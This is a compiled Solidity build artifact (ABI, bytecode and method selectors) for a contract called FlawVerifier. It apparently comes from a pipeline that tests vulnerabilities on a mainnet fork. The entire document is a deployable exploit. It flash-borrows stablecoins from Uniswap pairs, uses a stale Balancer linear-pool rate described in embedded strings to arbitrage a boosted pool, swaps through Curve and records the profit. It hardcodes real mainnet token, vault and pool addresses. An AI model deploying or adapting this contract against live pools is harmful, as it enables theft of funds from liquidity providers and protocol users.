{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploitPathAnchors","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"pure"},{"type":"function","name":"exploitPathUsed","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"pure"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"outcome","inputs":[],"outputs":[{"name":"","type":"uint8","internalType":"enum FlawVerifier.Outcome"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"runAlternatePublicLiquidityRoute","inputs":[{"name":"flawedPool","type":"address","internalType":"address"},{"name":"flawedMainToken","type":"address","internalType":"address"},{"name":"sourcePool","type":"address","internalType":"address"},{"name":"sourceMainToken","type":"address","internalType":"address"},{"name":"borrowAmount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"profit","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"snapshot","inputs":[],"outputs":[{"name":"","type":"tuple","internalType":"struct FlawVerifier.Snapshot","components":[{"name":"pool","type":"address","internalType":"address"},{"name":"paused","type":"bool","internalType":"bool"},{"name":"pauseWindowEndTime","type":"uint256","internalType":"uint256"},{"name":"bufferPeriodEndTime","type":"uint256","internalType":"uint256"},{"name":"totalSupply","type":"uint256","internalType":"uint256"},{"name":"vaultBptBalance","type":"uint256","internalType":"uint256"},{"name":"burnedSupply","type":"uint256","internalType":"uint256"},{"name":"approximateVirtualSupply","type":"uint256","internalType":"uint256"},{"name":"realVirtualSupply","type":"uint256","internalType":"uint256"},{"name":"reportedRate","type":"uint256","internalType":"uint256"},{"name":"trueRate","type":"uint256","internalType":"uint256"},{"name":"lowerTarget","type":"uint256","internalType":"uint256"},{"name":"upperTarget","type":"uint256","internalType":"uint256"},{"name":"swapFeePercentage","type":"uint256","internalType":"uint256"},{"name":"wrappedTokenRate","type":"uint256","internalType":"uint256"},{"name":"mainBalance","type":"uint256","internalType":"uint256"},{"name":"wrappedBalance","type":"uint256","internalType":"uint256"},{"name":"mainToken","type":"address","internalType":"address"},{"name":"wrappedToken","type":"address","internalType":"address"},{"name":"vault","type":"address","internalType":"address"}]}],"stateMutability":"view"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080806040523460155761372e908161001a8239f35b5f80fdfe6080806040526004361015610012575f80fd5b5f905f3560e01c90816310d1e85c14610dcb5750806327793f8714610d8e5780633c2448ed14610d74578063463defd114610d505780634934362414610d255780635ff972cc14610d085780638931ed94146106305780639711715a14610436578063cc1f2afa1461040e578063d78c4281146101705763fb13359314610097575f80fd5b3461016d578060031936011261016d57506101696040516100b960a082611654565b607d81527f656d657267656e63795f65786163745f6270745f696e5f666f725f746f6b656e60208201527f735f6f75742062617365706f6f6c2e6f6e65786974706f6f6c205f676574617060408201527f70726f78696d6174657669727475616c737570706c792074656d706f7261726960608201527f6c797061757361626c65206f6e7377617028292067657452617465282900000060808201526040519182916020835260208301906112b3565b0390f35b80fd5b503461016d578060031936011261016d57506101696102206101956040519182611654565b6101f481527f676f7665726e616e6365207061757365202d3e20656d657267656e63795f657860208201527f6163745f6270745f696e5f666f725f746f6b656e735f6f7574202d3e2062617360408201527f65706f6f6c2e6f6e65786974706f6f6c206275726e202d3e206765745261746560608201527f2f5f676574617070726f78696d6174657669727475616c737570706c7920737460808201527f616c652071756f7465202d3e2074656d706f726172696c797061757361626c6560a08201527f206175746f2d756e7061757365202d3e206c696e656172206f6e53776170207260c08201527f6573756d6573202d3e20626f6f7374656420646f776e73747265616d20706f6f60e08201527f6c207472757374696e6720746865207374616c65206c696e6561722d706f6f6c6101008201527f20726174652069732061726269747261676564207573696e67207075626c69636101208201527f206c69717569646974793b206966207468652070726f766964656420555344436101408201527f20746172676574206e65766572207265616368656420746865206275726e20736101608201527f74616765206f6e207468697320666f726b2c20746865207665726966696572206101808201527f7069766f747320746f2061207369626c696e67206c696e65617220706f6f6c206101a08201527f696e73696465207468652073616d6520626f6f7374656420706172656e7420746101c08201527f68617420646f657320657868696269742074686174206964656e746963616c206101e082015273706f73742d656d657267656e637920737461746560601b6102008201526040519182916020835260208301906112b3565b503461016d578060031936011261016d5760206040515f5160206136d95f395f51905f528152f35b503461016d578060031936011261016d5761044f61169d565b5061028060405161045f81611607565b6003549060018060a01b038216815260ff8260a01c161515602082015260045460408201526005546060820152600654608082015260075460a082015260085460c082015260095460e0820152600a54610100820152600b54610120820152600c54610140820152600d54610160820152600e54610180820152600f546101a08201526010546101c08201526011546101e082015260125461020082015260018060a01b036013541661022082015260018060a01b036014541661024082015260018060a01b03601554166102608201526040519160018060a01b0316825260208101511515602083015260408101516040830152606081015160608301526080810151608083015260a081015160a083015260c081015160c083015260e081015160e08301526101008101516101008301526101208101516101208301526101408101516101408301526101608101516101608301526101808101516101808301526101a08101516101a08301526101c08101516101c08301526101e08101516101e083015261020081015161020083015260018060a01b036102208201511661022083015260018060a01b036102408201511661024083015261026060018060a01b0391015116610260820152f35b50346109df5760a03660031901126109df5761064a61129d565b6024356001600160a01b03811692918382036109df576044356001600160a01b03811694908590036109df57606435946001600160a01b038616918287036109df5760843594303303610cd7578515610ca4576106a6906128cd565b80610c95575b15610c5b576040516370a0823160e01b815230600482015296602088602481736b175474e89094c44da98b954eedeac495271d0f5afa978815610a94575f98610c26575b506004916020916001600160a01b039061070990612937565b1695866001600160601b0360a01b60165416176016558760175560018060a01b031690816001600160601b0360a01b60185416176018556001600160601b0360a01b60195416176019556040519283809263038fff2d60e41b82525afa908115610a94575f91610bf3575b50600491602091601a55806001600160601b0360a01b601b541617601b55836001600160601b0360a01b601c541617601c556040519283809263038fff2d60e41b82525afa908115610a94575f91610bc1575b50601d5560405163038fff2d60e41b815260208160048173a13a9247ea42d743238089903570127dda72fe445afa908115610a94575f91610b8f575b50601e558115610b6057604051630dfe168160e01b815290602082600481865afa918215610a94575f92610b24575b5060405163d21220a760e01b815291602083600481875afa928315610a94575f93610ae7575b506001600160a01b03168114918291908215610ad4575b505015610a9f5715610a0f57604051916001602084015260208352610895604084611654565b813b15610a0b579183916108d9938360405180968195829463022c0d9f60e01b845260048401528360248401523060448401526080606484015260848301906112b3565b03925af180156109eb579082916109f6575b50505b6040516370a0823160e01b8152306004820152602081602481736b175474e89094c44da98b954eedeac495271d0f5afa9081156109eb5782916109b5575b50828111156109845760209261094191611690565b815462010000600160b01b031916756b175474e89094c44da98b954eedeac495271d0f00001790915560018190556002805460ff19166006179055604051908152f35b60405162461bcd60e51b81526020600482015260096024820152681b9bcb5c1c9bd99a5d60ba1b6044820152606490fd5b90506020813d6020116109e3575b816109d060209383611654565b810103126109df57515f61092c565b5f80fd5b3d91506109c3565b6040513d84823e3d90fd5b81610a0091611654565b61016d57805f6108eb565b8380fd5b906040516001602082015260208152610a29604082611654565b823b156109df57610a6c925f928360405180968195829463022c0d9f60e01b845284600485015260248401523060448401526080606484015260848301906112b3565b03925af18015610a9457610a81575b506108ee565b610a8d91505f90611654565b5f5f610a7b565b6040513d5f823e3d90fd5b60405162461bcd60e51b815260206004820152600d60248201526c0e0c2d2e45adad2e6dac2e8c6d609b1b6044820152606490fd5b6001600160a01b03161490505f8061086f565b9092506020813d602011610b1c575b81610b0360209383611654565b810103126109df57610b158291611745565b9290610858565b3d9150610af6565b9091506020813d602011610b58575b81610b4060209383611654565b810103126109df57610b5190611745565b905f610832565b3d9150610b33565b60405162461bcd60e51b8152602060048201526007602482015266373796b830b4b960c91b6044820152606490fd5b90506020813d602011610bb9575b81610baa60209383611654565b810103126109df57515f610803565b3d9150610b9d565b90506020813d602011610beb575b81610bdc60209383611654565b810103126109df57515f6107c7565b3d9150610bcf565b90506020813d602011610c1e575b81610c0e60209383611654565b810103126109df57516004610774565b3d9150610c01565b9097506020813d602011610c53575b81610c4260209383611654565b810103126109df57519660046106f0565b3d9150610c35565b60405162461bcd60e51b8152602060048201526012602482015271756e737570706f727465642d737461626c6560701b6044820152606490fd5b50610c9f876128cd565b6106ac565b60405162461bcd60e51b815260206004820152600b60248201526a7a65726f2d626f72726f7760a81b6044820152606490fd5b60405162461bcd60e51b815260206004820152600960248201526873656c662d6f6e6c7960b81b6044820152606490fd5b346109df575f3660031901126109df576020600154604051908152f35b346109df575f3660031901126109df575f5460405160109190911c6001600160a01b03168152602090f35b346109df575f3660031901126109df57602060ff5f5460081c166040519015158152f35b346109df575f3660031901126109df57610d8c6112d7565b005b346109df575f3660031901126109df5760ff600254166040516007821015610db7576020918152f35b634e487b7160e01b5f52602160045260245ffd5b346109df5760803660031901126109df57610de461129d565b90602435916064359167ffffffffffffffff83116109df57366023840112156109df5782600401359267ffffffffffffffff84116109df5760248436920101116109df576016546001600160a01b03169081156112705750330361123757306001600160a01b03909116036111fc57156111c85780156111bf575b601754810361118657610f0360018060a01b03601c5416610ebe60405163095ea7b360e01b602082015273ba12222222228d8ba445958a75a0704d566bf2c860248201525f604482015260448152610eb8606482611654565b82613462565b60405163095ea7b360e01b602082015273ba12222222228d8ba445958a75a0704d566bf2c860248201526044808201859052815290610efe606483611654565b613462565b610f66610f49610f2c83601d5460018060a01b03601c541660018060a01b03601b541691612a64565b601e54601b546018546001600160a01b0390811692911690612a64565b601a546018546019546001600160a01b0390811692911690612a64565b601954601c546001600160a01b03918216929116808303611174575b5050506103e88102908082046103e81490151715611160576103e590046001810180911161116057601c546040516370a0823160e01b81523060048201526001600160a01b039091169190602081602481865afa8015610a945782915f9161112b575b50106110ed5760405163a9059cbb60e01b602082015233602482015260448082019290925290815261101c91610efe606483611654565b601c546040516370a0823160e01b81523060048201526001600160a01b0390911690602081602481855afa908115610a94575f916110bb575b50736b175474e89094c44da98b954eedeac495271d0f821415806110b2575b6110a1575b5f6016555f6017555f6018555f6019555f601a555f601b555f601c555f601d555f601e555f80f35b6110aa91612bef565b508080611079565b50801515611074565b90506020813d6020116110e5575b816110d660209383611654565b810103126109df575182611055565b3d91506110c9565b60405162461bcd60e51b8152602060048201526016602482015275696e73756666696369656e742d666f722d726570617960501b6044820152606490fd5b9150506020813d602011611158575b8161114760209383611654565b810103126109df5781905184610fe5565b3d915061113a565b634e487b7160e01b5f52601160045260245ffd5b61117d92612e52565b50818080610f82565b60405162461bcd60e51b8152602060048201526011602482015270756e65787065637465642d626f72726f7760781b6044820152606490fd5b50604435610e5f565b60405162461bcd60e51b815260206004820152600c60248201526b6d697373696e672d6461746160a01b6044820152606490fd5b60405162461bcd60e51b81526020600482015260136024820152723ab730baba3437b934bd32b216b9b2b73232b960691b6044820152606490fd5b60405162461bcd60e51b81526020600482015260116024820152703ab730baba3437b934bd32b216b830b4b960791b6044820152606490fd5b62461bcd60e51b8152602060048201526008602482015267696e61637469766560c01b6044820152606490fd5b600435906001600160a01b03821682036109df57565b805180835260209291819084018484015e5f828201840152601f01601f1916010190565b5f5460ff81166115ce5761ff01600160b01b031916756b175474e89094c44da98b954eedeac495271d0f0001175f90815560019081556002805460ff1916909117905561132261188e565b60026060820151106114b057611337816127c7565b805160038054602084015160ff60a01b90151560a081811b929092166001600160a81b03199093166001600160a01b039586161792909217909255604084015160045560608401805160055560808501516006559184015160075560c084015160085560e0840151600955610100840151600a55610120840151600b55610140840151600c55610160840151600d55610180840151600e556101a0840151600f556101c08401516010556101e0840151601155610200840151601255610220840151601380549185166001600160a01b03199283161790556102408501516014805491861691831691909117905561026085015160158054919095169116179092559060ff61144584612839565b151561ff005f549160081b169061ff00191617805f5560081c16156114aa5761149957514211156114885761148691600560ff196002541617600255612876565b565b5050600360ff196002541617600255565b505050600260ff1981541617600255565b50505050565b506115bf6114bc611acd565b80516003805460208401516001600160a01b039384166001600160a81b03199092169190911790151560a090811b60ff60a01b169190911790915560408301516004556060830151600555608083015160065582015160075560c082015160085560e0820151600955610100820151600a55610120820151600b55610140820151600c55610160820151600d55610180820151600e556101a0820151600f556101c08201516010556101e0820151601155610200820151601255610220820151601380546001600160a01b031990811692841692909217905561024083015160148054831691841691909117905561026090920151601580549093169116179055565b600460ff196002541617600255565b60405162461bcd60e51b8152602060048201526011602482015270185b1c9958591e4b585d1d195b5c1d1959607a1b6044820152606490fd5b610280810190811067ffffffffffffffff82111761162457604052565b634e487b7160e01b5f52604160045260245ffd5b6080810190811067ffffffffffffffff82111761162457604052565b90601f8019910116810190811067ffffffffffffffff82111761162457604052565b6001600160701b0303906001600160701b03821161116057565b9190820391821161116057565b604051906116aa82611607565b5f610260838281528260208201528260408201528260608201528260808201528260a08201528260c08201528260e08201528261010082015282610120820152826101408201528261016082015282610180820152826101a0820152826101c0820152826101e08201528261020082015282610220820152826102408201520152565b67ffffffffffffffff81116116245760051b60200190565b51906001600160a01b03821682036109df57565b90916060828403126109df57815167ffffffffffffffff81116109df57820183601f820112156109df5780519061178f8261172d565b9161179d6040519384611654565b80835260208084019160051b830101918683116109df57602001905b82821061183d5750505092602083015167ffffffffffffffff81116109df5783019080601f830112156109df5781516117f18161172d565b926117ff6040519485611654565b81845260208085019260051b8201019283116109df57602001905b82821061182d5750505060409092015190565b815181526020918201910161181a565b6020809161184a84611745565b8152019101906117b9565b80518210156118695760209160051b010190565b634e487b7160e01b5f52603260045260245ffd5b9060038110156118695760051b0190565b60405161189a81611638565b5f81526060906040516118ad8382611654565b8236823760208201526040516118c38382611654565b8236823760408201525f82820152806118da612fc5565b15611ac7575060405163038fff2d60e41b815260208160048173a13a9247ea42d743238089903570127dda72fe445afa908115610a94575f91611a95575b5080825260405190631f29a8cd60e31b825260048201525f8160248173ba12222222228d8ba445958a75a0704d566bf2c85afa908115610a94575f91611a71575b505f5b8151811080611a64575b15611a5d576001600160a01b0361197d8284611855565b511673a13a9247ea42d743238089903570127dda72fe448114611a5757604051634de046d560e01b8152602081600481855afa5f9181611a1c575b506119d1575b50505b5f1981146111605760010161195c565b6001600160a01b03168015611a15576020850151916119f58787019384519061187d565b52611a06604086015183519061187d565b52600181510190525f806119be565b50506119c1565b9091506020813d8211611a4f575b81611a3760209383611654565b810103126109df57611a4890611745565b905f6119b8565b3d9150611a2a565b506119c1565b5050919050565b5060038484015110611966565b611a8d91503d805f833e611a858183611654565b810190611759565b50505f611959565b90506020813d602011611abf575b81611ab060209383611654565b810103126109df57515f611918565b3d9150611aa3565b91505090565b611ad561169d565b905f5160206136d95f395f51905f52825260405190634de046d560e01b82526020826004815f5160206136d95f395f51905f525afa918215610a94575f926121a2575b506001600160a01b03909116610220830190815260405163f174e24160e01b815290916020826004815f5160206136d95f395f51905f525afa918215610a94575f92612166575b506001600160a01b0390911661024084019081526040516311b2515f60e31b8152929091906020846004815f5160206136d95f395f51905f525afa938415610a94575f9461212a575b506001600160a01b0390931661026085019081526040516318160ddd60e01b815293906020856004815f5160206136d95f395f51905f525afa948515610a94575f956120f6575b5060808601948552604051630ab8cec560e31b81526020816004815f5160206136d95f395f51905f525afa908115610a94575f916120c4575b506101a0870152604051631ea8635560e31b81526020816004815f5160206136d95f395f51905f525afa908115610a94575f91612092575b506101c0870152604080516331ff1dab60e11b815290816004815f5160206136d95f395f51905f525afa8015610a94575f915f91612059575b50610180880152610160870152604051631c0de05160e01b81526060816004815f5160206136d95f395f51905f525afa908115610a94575f915f915f91612010575b50606089015260408801521515602087015260018060a01b039051169160405163038fff2d60e41b81526020816004815f5160206136d95f395f51905f525afa8015610a94575f90611fde575b5f9150602460405180968193631f29a8cd60e31b835260048301525afa948515610a94575f935f96611fbb575b506040516341343d2b60e11b81526020816004815f5160206136d95f395f51905f525afa8015610a94575f90611f87575b611d91915087611855565b5160a08801908152905f5f19805b8751831015611e10576001600160a01b03611dba848a611855565b5188516001600160a01b0316911603611dd957506001825b0191611d9f565b916001600160a01b03611dec828a611855565b518a516001600160a01b0316911614611e08575b600190611dd2565b905080611e00565b955093979296505093505f198314611f53575f198214611f1c57611e37611e439382611855565b516101e0880152611855565b5161020085015280516001600160701b03811015611f1557611e6490611676565b60c0850152611e738251611676565b60e085015251905180821115611f0d57611e8c91611690565b6101008301526040516333cd77e760e11b81526020816004815f5160206136d95f395f51905f525afa908115610a94575f91611edb575b50610120830152611ed3826130fc565b610140830152565b90506020813d602011611f05575b81611ef660209383611654565b810103126109df57515f611ec3565b3d9150611ee9565b50505f611e8c565b505f611e64565b60405162461bcd60e51b815260206004820152600f60248201526e1b5a5cdcda5b99cb5ddc985c1c1959608a1b6044820152606490fd5b60405162461bcd60e51b815260206004820152600c60248201526b36b4b9b9b4b73396b6b0b4b760a11b6044820152606490fd5b506020813d602011611fb3575b81611fa160209383611654565b810103126109df57611d919051611d86565b3d9150611f94565b909550611fd39193503d805f833e611a858183611654565b50929092945f611d55565b506020813d602011612008575b81611ff860209383611654565b810103126109df575f9051611d28565b3d9150611feb565b925050506060813d606011612051575b8161202d60609383611654565b810103126109df5761203e816130d6565b604060208301519201519091905f611cdb565b3d9150612020565b9150506040813d60401161208a575b8161207560409383611654565b810103126109df57602081519101515f611c99565b3d9150612068565b90506020813d6020116120bc575b816120ad60209383611654565b810103126109df57515f611c60565b3d91506120a0565b90506020813d6020116120ee575b816120df60209383611654565b810103126109df57515f611c28565b3d91506120d2565b9094506020813d602011612122575b8161211260209383611654565b810103126109df5751935f611bef565b3d9150612105565b9093506020813d60201161215e575b8161214660209383611654565b810103126109df5761215790611745565b925f611ba8565b3d9150612139565b9091506020813d60201161219a575b8161218260209383611654565b810103126109df5761219390611745565b905f611b5f565b3d9150612175565b9091506020813d6020116121d6575b816121be60209383611654565b810103126109df576121cf90611745565b905f611b18565b3d91506121b1565b906121e761169d565b916001600160a01b03169081156127c357818352604051634de046d560e01b815290602082600481865afa918215610a94575f92612787575b506001600160a01b03909116610220840190815260405163f174e24160e01b81529190602083600481875afa928315610a94575f9361274b575b506001600160a01b0390921661024085019081526040516311b2515f60e31b815290929091602083600481885afa928315610a94575f9361270f575b506001600160a01b0390921661026086019081526040516318160ddd60e01b81529290602084600481895afa938415610a94575f946126db575b5060808701938452604051630ab8cec560e31b81526020816004818a5afa908115610a94575f916126a9575b506101a0880152604051631ea8635560e31b81526020816004818a5afa908115610a94575f91612677575b506101c0880152604080516331ff1dab60e11b815290816004818a5afa8015610a94575f915f9161263e575b50610180890152610160880152604051631c0de05160e01b81526060816004818a5afa908115610a94575f915f915f916125f5575b5060608a015260408901521515602088015260018060a01b039051169260405163038fff2d60e41b81526020816004818a5afa8015610a94575f906125c3575b5f9150602460405180978193631f29a8cd60e31b835260048301525afa8015610a94575f945f916125a2575b506040516341343d2b60e11b81526020816004818b5afa8015610a94575f9061256e575b612423915082611855565b519660a089019788525f199788935f995b88518b10156124a5576001600160a01b0361244f8c8b611855565b5189516001600160a01b031691160361246e575060018a5b0199612434565b996001600160a01b03612481828b611855565b518b516001600160a01b031691161461249d575b600190612467565b945084612495565b93975093975093975093505f198114611f53575f198614611f1c57600495856124d36124df93602098611855565b516101e08b0152611855565b5161020088015280516001600160701b038110156125675761250090611676565b60c088015261250f8251611676565b60e08801525190518082111561255f5761252891611690565b6101008601526040516333cd77e760e11b815292839182905afa908115610a94575f91611edb5750610120830152611ed3826130fc565b50505f612528565b505f612500565b506020813d60201161259a575b8161258860209383611654565b810103126109df576124239051612418565b3d915061257b565b90506125b99194503d805f833e611a858183611654565b509390935f6123f4565b506020813d6020116125ed575b816125dd60209383611654565b810103126109df575f90516123c8565b3d91506125d0565b925050506060813d606011612636575b8161261260609383611654565b810103126109df57612623816130d6565b604060208301519201519091905f612388565b3d9150612605565b9150506040813d60401161266f575b8161265a60409383611654565b810103126109df57602081519101515f612353565b3d915061264d565b90506020813d6020116126a1575b8161269260209383611654565b810103126109df57515f612327565b3d9150612685565b90506020813d6020116126d3575b816126c460209383611654565b810103126109df57515f6122fc565b3d91506126b7565b9093506020813d602011612707575b816126f760209383611654565b810103126109df5751925f6122d0565b3d91506126ea565b9092506020813d602011612743575b8161272b60209383611654565b810103126109df5761273c90611745565b915f612296565b3d915061271e565b9092506020813d60201161277f575b8161276760209383611654565b810103126109df5761277890611745565b915f61225a565b3d915061275a565b9091506020813d6020116127bb575b816127a360209383611654565b810103126109df576127b490611745565b905f612220565b3d9150612796565b9050565b6127cf61169d565b506127d8611acd565b906127e282612839565b612835575f5b60608201518110156128305761281360018060a01b0361280c83602086015161187d565b51166121de565b61281c81612839565b61282957506001016127e8565b9250505090565b505090565b5090565b80516001600160a01b031615159081612868575b81612856575090565b90506101406101208201519101511190565b60c08101511515915061284d565b5f5b60608201518110156128c8576128bc60018060a01b0361289c83602086015161187d565b511660018060a01b036128b384604087015161187d565b5116908561321d565b6128c857600101612878565b505050565b60018060a01b0316736b175474e89094c44da98b954eedeac495271d0f8114908115612919575b81156128fe575090565b73dac17f958d2ee523a2206206994597c13d831ec791501490565b73a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48811491506128f4565b6001600160a01b031673a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4881146129c557736b175474e89094c44da98b954eedeac495271d0f81146129ac5773dac17f958d2ee523a2206206994597c13d831ec714612994575f90565b730d4a11d5eeaac28ec3f61d100daf4d40471f185290565b5073a478c2975ab1ea89e8196811f51a7b7ade33eb1190565b5073b4e16d0168e52d35cacd2c6185b44281ec28c9dc90565b9061148691612a2560405163095ea7b360e01b602082015273bebc44782c7db0a1a60cb6fe97d0b483032ff1c760248201525f604482015260448152610eb8606482611654565b6040519163095ea7b360e01b602084015273bebc44782c7db0a1a60cb6fe97d0b483032ff1c76024840152604483015260448252610efe606483611654565b929190916040519360c0850185811067ffffffffffffffff8211176116245760409081525f60208701908152606060a088018181529388526001600160a01b039687168884019081529690951694870194855260808701938452905192949291612acd83611638565b60208301604084019160608501933086525f83523084525f8552604051996352bbbe2960e01b8b5260e060048c01525160e48b015251906002821015610db7576020988a988998612b59946101048b015260018060a01b039051166101248a015260018060a01b03905116610144890152516101648801525160c06101848801526101a48701906112b3565b93516001600160a01b039081166024870152905115156044860152905116606484015251151560848301525f60a483018190524260c484015291900390829073ba12222222228d8ba445958a75a0704d566bf2c85af1908115610a94575f91612bc0575090565b90506020813d602011612be7575b81612bdb60209383611654565b810103126109df575190565b3d9150612bce565b908015612e1957612bff82613550565b90612c1d736b175474e89094c44da98b954eedeac495271d0f613550565b600f0b91600f0b91808314612de1576040516370a0823160e01b815230600482015293602085602481736b175474e89094c44da98b954eedeac495271d0f5afa948515610a94575f95612dad575b5082612c76916129de565b60405192630f7c084960e21b84526004840152602483015260448201525f60648201526020816084815f73bebc44782c7db0a1a60cb6fe97d0b483032ff1c75af18015610a9457612d7e575b506040516370a0823160e01b815230600482015290602082602481736b175474e89094c44da98b954eedeac495271d0f5afa8015610a94575f90612d4a575b612d0b9250611690565b908115612d1457565b60405162461bcd60e51b815260206004820152600e60248201526d18dd5c9d994b5e995c9bcb5bdd5d60921b6044820152606490fd5b506020823d602011612d76575b81612d6460209383611654565b810103126109df57612d0b9151612d01565b3d9150612d57565b6020813d602011612da5575b81612d9760209383611654565b810103126109df5751612cc2565b3d9150612d8a565b9094506020813d602011612dd9575b81612dc960209383611654565b810103126109df57519382612c6b565b3d9150612dbc565b60405162461bcd60e51b815260206004820152601060248201526f39b0b6b296b1bab93b3296ba37b5b2b760811b6044820152606490fd5b60405162461bcd60e51b81526020600482015260116024820152701e995c9bcb58dd5c9d994b585b5bdd5b9d607a1b6044820152606490fd5b908215612e1957612e6282613550565b92612e6c82613550565b600f0b93600f0b91848314612de1576040516370a0823160e01b81523060048201526001600160a01b0391909116949093602085602481895afa948515610a94575f95612f71575b5082612ebf916129de565b60405192630f7c084960e21b84526004840152602483015260448201525f60648201526020816084815f73bebc44782c7db0a1a60cb6fe97d0b483032ff1c75af18015610a9457612f40575b506020602492604051938480926370a0823160e01b82523060048301525afa8015610a94575f90612d4a57612d0b9250611690565b6020813d602011612f69575b81612f5960209383611654565b810103126109df57506020612f0b565b3d9150612f4c565b9094506020813d602011612f9d575b81612f8d60209383611654565b810103126109df57519382612eb4565b3d9150612f80565b8181029291811591840414171561116057565b9190820180921161116057565b60405163038fff2d60e41b815260208160048173a13a9247ea42d743238089903570127dda72fe445afa5f91816130a2575b5061300157505f90565b60405190631f29a8cd60e31b825260048201525f8160248173ba12222222228d8ba445958a75a0704d566bf2c85afa908115610a94575f91613086575b505f5b8151811015613080575f5160206136d95f395f51905f526001600160a01b0361306a8385611855565b51161461307957600101613041565b5050600190565b50505f90565b61309a91503d805f833e611a858183611654565b50505f61303e565b9091506020813d6020116130ce575b816130be60209383611654565b810103126109df5751905f612ff7565b3d91506130b1565b519081151582036109df57565b908160209103126109df575160ff811681036109df5790565b6101008101805115613080576101e082015161022083015160405163313ce56760e01b81529190602090839060049082906001600160a01b03165afa908115610a945761315661315c926004945f916131ee575b5061360c565b90612fa5565b9261020081015193602060018060a01b03610240840151166040519485809263313ce56760e01b82525afa908115610a9457670de0b6b3a76400006131c46131b86131eb986131566131de966131e3995f916131ee575061360c565b6101c086015190612fa5565b04926101608101516101a06101808301519201519261362c565b612fb8565b905190613683565b90565b613210915060203d602011613216575b6132088183611654565b8101906130e3565b5f613150565b503d6131fe565b805190916001600160a01b03808216921682148015613452575b61344a5761324660c0916121de565b0151613443576040519261010061325d8186611654565b36853760405163313ce56760e01b81526001600160a01b039190911690602081600481855afa908115610a945761329f9160ff915f91613424575b50166135fe565b80612710026127108104820361116057855280614e2002614e208104820361116057602086015280619c4002619c4081048203611160576040860152806201388002620138808104820361116057606086015280620249f002620249f08104820361116057608086015280620493e002620493e0810482036111605760a086015280620927c002620927c0810482036111605760c086015280620f42400290620f42408204036111605760e08501525f5b600881101561341b578060051b850151801561341257845161022086015160405163224c7b6560e21b81526001600160a01b039283166004820152911660248201526044810185905260648101849052608481019190915260208160a4815f305af15f91816133df575b506133cb575b506001905b01613350565b6133d5575f6133c0565b5050505050600190565b9091506020813d821161340a575b816133fa60209383611654565b810103126109df5751905f6133ba565b3d91506133ed565b506001906133c5565b50505050505f90565b61343d915060203d602011613216576132088183611654565b5f613298565b5050505f90565b505050505f90565b5061345c846128cd565b15613237565b5f91829182602083519301915af13d15613548573d9067ffffffffffffffff8211611624576040519161349f601f8201601f191660200184611654565b82523d5f602084013e5b1561350f578051806134b9575050565b81602091810103126109df5760206134d191016130d6565b156134d857565b60405162461bcd60e51b815260206004820152600f60248201526e1d1bdad95b8b5bdc0b59985a5b1959608a1b6044820152606490fd5b60405162461bcd60e51b81526020600482015260116024820152701d1bdad95b8b58d85b1b0b59985a5b1959607a1b6044820152606490fd5b6060906134a9565b6001600160a01b0316736b175474e89094c44da98b954eedeac495271d0f81146135f95773a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4881146135f35773dac17f958d2ee523a2206206994597c13d831ec7146135ee5760405162461bcd60e51b815260206004820152601760248201527f63757276652d756e737570706f727465642d746f6b656e0000000000000000006044820152606490fd5b600290565b50600190565b505f90565b604d811161116057600a0a90565b60ff1660128110156135f35760120360128111611160576131eb906135fe565b9291908084106136665750808311156128305761365f839261365a670de0b6b3a7640000936131eb96611690565b612fa5565b0490611690565b670de0b6b3a76400009150839261365a6131eb9561365f93611690565b801561308057670de0b6b3a76400008102908104670de0b6b3a76400000361116057816136af91612fb8565b5f1981019081116111605781156136c4570490565b634e487b7160e01b5f52601260045260245ffdfe0000000000000000000000009210f1204b5a24742eba12f710636d76240df3d0a264697066735822122040dc0e2e1ba079d699c2704aeb15a4d6502aa7dcbe460fed82c32a6ec1cce92864736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","executeOnOpportunity()":"3c2448ed","exploitPathAnchors()":"fb133593","exploitPathUsed()":"d78c4281","hypothesisValidated()":"463defd1","outcome()":"27793f87","profitAmount()":"5ff972cc","profitToken()":"49343624","runAlternatePublicLiquidityRoute(address,address,address,address,uint256)":"8931ed94","snapshot()":"9711715a","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}